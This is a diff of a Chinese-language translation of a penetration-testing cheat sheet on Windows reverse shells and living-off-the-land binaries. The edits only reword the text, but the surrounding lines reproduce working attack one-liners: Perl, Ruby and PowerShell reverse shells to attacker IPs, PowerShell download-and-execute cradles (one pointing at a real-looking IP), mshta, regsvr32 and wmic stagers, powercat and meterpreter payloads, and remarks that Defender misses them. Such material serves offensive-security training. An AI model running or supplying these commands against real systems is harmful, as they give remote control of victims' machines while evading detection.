@@ -4,7 +4,7 @@
 
 ## Lolbas
 
-该页面 [lolbas-project.github.io](https://lolbas-project.github.io/) 是针对 Windows 的，类似于 [https://gtfobins.github.io/](https://gtfobins.github.io/) 针对 Linux。\
+该页面 [lolbas-project.github.io](https://lolbas-project.github.io/) 针对 Windows，就像 [https://gtfobins.github.io/](https://gtfobins.github.io/) 针对 Linux 一样。\
 显然，**Windows 中没有 SUID 文件或 sudo 权限**，但了解 **如何** 一些 **二进制文件** 可以被（滥）用来执行某种意外操作，如 **执行任意代码**，是很有用的。
 
 ## NC
@@ -49,7 +49,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## 红宝石
+## Ruby
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -82,14 +82,14 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 执行网络调用的进程：**powershell.exe**\
-写入磁盘的有效载荷：**没有** (_至少在我使用 procmon 时找不到！_)
+写入磁盘的有效载荷：**没有** (_至少在我使用 procmon 时找不到任何地方！_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 执行网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV 客户端本地缓存**
+写入磁盘的有效载荷：**WebDAV client local cache**
 
-**一行代码：**
+**一行命令：**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -113,7 +113,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**您可以通过 stager hta 非常轻松地下载和执行 Koadic 僵尸**
+**您可以非常轻松地使用 stager hta 下载并执行 Koadic 僵尸**
 
 #### hta 示例
 
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**从这里**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -324,7 +324,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **未检测到**
 
-**您可以使用 stager wmic 非常轻松地下载并执行 Koadic 僵尸**
+**您可以非常轻松地使用 stager wmic 下载并执行 Koadic 僵尸**
 
 ## Msbuild
 
@@ -347,7 +347,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```
 您可以从这里下载一个基本的 C# 反向 shell: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**未检测**
+**未被检测**
 
 ## **Regasm/Regsvc**
 
@@ -379,7 +379,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-在网络服务器上启动脚本并在受害者端执行它：
+在网络服务器上启动脚本并在受害者端执行：
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -395,11 +395,11 @@ Defender 目前尚未将其检测为恶意代码（截至2019年3月4日）。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender 目前尚未将其检测为恶意代码（截至2019年3月4日）。
+Defender 尚未将其检测为恶意代码（截至 2019 年 3 月 4 日）。
 
 **powercat 提供的其他选项：**
 
-绑定 shell，反向 shell（TCP，UDP，DNS），端口重定向，上传/下载，生成有效负载，提供文件...
+绑定 shell、反向 shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成有效负载、提供文件...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -438,7 +438,7 @@ python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 msfconsole -r unicorn.rc
 ```
-启动一个网络服务器，提供 _powershell_attack.txt_ 文件，并在受害者上执行：
+启动一个网络服务器，提供 _powershell_attack.txt_ 文件，并在受害者机器上执行：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
